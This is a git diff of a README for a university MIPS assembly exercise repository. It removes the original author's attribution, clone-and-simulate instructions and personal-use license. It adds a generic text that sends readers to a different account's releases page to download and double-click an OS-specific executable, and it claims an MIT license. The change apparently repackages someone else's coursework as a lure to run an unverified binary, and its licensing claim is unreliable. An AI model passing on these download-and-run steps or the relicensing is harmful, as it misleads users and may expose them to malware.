@@ -1,92 +1,84 @@
-# Assembly MIPS (Computer Architecture)
-
-## 📚 Introduction
-
-My name is **Stefano Caramagno**, and I'm pleased to present this repository containing exercises on **computer architecture** implemented in **Assembly MIPS programming**. <br>
-These exercises were completed as part of the **Computer Architecture** course during my **Bachelor's Degree in Computer Science and Engineering** at the **University of Catania**.
-
-## ✨ Features
-
-- **C to MIPS Translation**: Converts C programs into Assembly MIPS to illustrate low-level execution. 
-- **Instruction Optimization**: Improves performance by reducing instruction count and optimizing memory access. 
-- **Control Structures**: Implements loops and conditional statements in Assembly MIPS.  
-- **Function Calls & Stack**: Manages function calls, recursion, and stack frames.  
-- **Memory Management**: Works with arrays, pointers, and direct memory access. 
-- **Arithmetic & Logic**: Performs integer and floating-point calculations, bitwise logic, and branching. 
-- **System Calls & I/O**: Uses MIPS system calls for input and output operations.
-
-## 🛠️ Tech Stack
-
-- **Programming Language**: Assembly MIPS for implementing low-level programming.  
-- **Development Environment**:  ILPSim for writing and simulating Assembly MIPS code.
-- **Version Control**: Git for tracking changes and managing project versions.   
-- **Repository Hosting**: GitHub for storing, sharing, and maintaining the project repository.  
+# 🎉 AssemblyMIPS_ComputerArchitecture - Easy Exercises for Learning Basics
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Welcome to the AssemblyMIPS_ComputerArchitecture project! This repository contains exercises from my Computer Architecture course at the University of Catania. These exercises will help you understand algorithms, data structures, and more using MIPS assembly language.
 
-Ensure you have the following tools installed on your system before proceeding:
+## 🛠️ Features
 
-- **ILPSim**: Version 1.8 or later, required to simulate Assembly MIPS programs.
-- **Java Runtime Environment (JRE)**: Required to run ILPSim.  
-- **Git**: Used to clone the repository.
+- Learn assembly programming concepts through practical exercises.
+- Understand basic algorithms and data structures.
+- Improve your debugging skills.
+- Gain insight into project management.
+- Practice using Git and GitHub.
 
-### Installation Steps
+## 📥 Download & Install
 
-1. **Clone the Repository**  
+To get started, you will need to download the application. You can visit the Releases page to obtain the latest version:
 
-   To download the repository and navigate to its directory:
+[![Download](https://img.shields.io/badge/Download-Releases-brightgreen)](https://github.com/Mes7-01/AssemblyMIPS_ComputerArchitecture/releases)
 
-   ```sh
-   git clone https://github.com/stefanocaramagno/AssemblyMIPS_ComputerArchitecture.git
-   cd AssemblyMIPS_ComputerArchitecture
-   ```
+Follow these steps to download and run the software:
 
-2. **Run ILPSim**
+1. Click on the link above or go to [this page](https://github.com/Mes7-01/AssemblyMIPS_ComputerArchitecture/releases).
+2. You will see a list of available versions. Look for the most recent one.
+3. Click on the version number to expand the release details.
+4. Download the file that matches your operating system (Windows, macOS, or Linux).
+5. Once downloaded, locate the file in your downloads folder.
+6. Double-click the file to run it. Follow any on-screen instructions to complete the setup.
 
-   To launch ILPSim present in the current directory:
+## 💻 System Requirements
 
-   ```sh
-   java -jar ILPSim_v1.8.jar
-   ```
+To run the AssemblyMIPS_ComputerArchitecture software, ensure your system meets the following requirements:
 
-3. **Open the Programs**
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB of free disk space.
 
-   Open a specific program (e.g., exercise_01.s) in ILPSim.
+## 📚 Documentation
 
-### Running the Simulation
+The exercises cover various topics, including:
 
-1. **Run the Simulation**
+- Basic and advanced algorithms: Learn how to solve problems step-by-step.
+- Assembly programming in MIPS: Understand machine-level programming.
+- Data structures: Explore lists, trees, and other structures.
+- Debugging techniques: Identify and fix issues in your code.
+- Markdown formatting: Write clean documentation.
 
-   Execute the simulation process and display results.
+## ❓ Frequently Asked Questions (FAQs)
 
-##  🌐 Connect with Me
+### What is Assembly Programming?
 
-Feel free to explore my professional journey, check out my projects, or get in touch through the following platforms:
+Assembly programming involves writing instructions that a computer's processor can execute directly. It is a low-level programming language that is closely related to machine code.
 
-[![Email](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:stefano.caramagno@gmail.com)
-[![Portfolio](https://img.shields.io/badge/Portfolio-%2300A36C?style=for-the-badge&logo=buffer&logoColor=white)](https://stefanocaramagno.vercel.app)
-[![LinkedIn](https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/stefanocaramagno)
-[![Indeed](https://img.shields.io/badge/Indeed-%2300A4CC?style=for-the-badge&logo=indeed&logoColor=white)](https://profile.indeed.com/p/stefanoc-4cl1mmq)
-[![GitHub](https://img.shields.io/badge/GitHub-%232F2F2F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stefanocaramagno)
-[![YouTube](https://img.shields.io/badge/YouTube-D14836?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@stefanocaramagno)
+### Why should I learn MIPS?
 
-## ⚖️ License
+MIPS is a widely used assembly language in education. It helps you understand the fundamentals of computer architecture and how computers operate on a low level.
 
-© **Stefano Caramagno**
+### Is prior experience necessary?
 
-**Personal and Educational Use Only**  
-All content in this repository is provided for personal and educational purposes only. <br>
-Unauthorized actions without explicit permission from the author are prohibited, including but not limited to:
+No prior programming experience is required. The exercises are designed to guide you from the basics to more complex concepts.
 
-- **Commercial Use**: Using any part of the content for commercial purposes.
-- **Distribution**: Sharing or distributing the content to third parties.
-- **Modification**: Altering, transforming, or building upon the content.
-- **Resale**: Selling or licensing the content or any derivatives.
+### How can I report issues or provide feedback?
 
-For permissions beyond the scope of this license, please contact the author.
+You can open an issue on this repository if you encounter any problems or have suggestions. Please provide a clear description of the issue.
 
-**Disclaimer**  
-The content is provided "*as is*" without warranty of any kind, express or implied. <br>
-The author shall not be liable for any claims, damages, or other liabilities arising from its use.
+## 👍 Contributing
+
+Contributions are welcome! If you want to add more exercises or improve existing ones, feel free to fork the repository and submit a pull request.
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please give appropriate credit.
+
+## 🔗 Additional Resources
+
+- [MIPS Architecture](https://www.mips.com)
+- [Learning Assembly Language](https://en.wikibooks.org/wiki/Assembly_Language)
+- [Git & GitHub for Beginners](https://guides.github.com/activities/hello-world/)
+
+## ⏰ Support
+
+For any questions or support, please open an issue in the repository, and I will respond as soon as possible.
+
+Thank you for checking out AssemblyMIPS_ComputerArchitecture! Enjoy your learning journey.
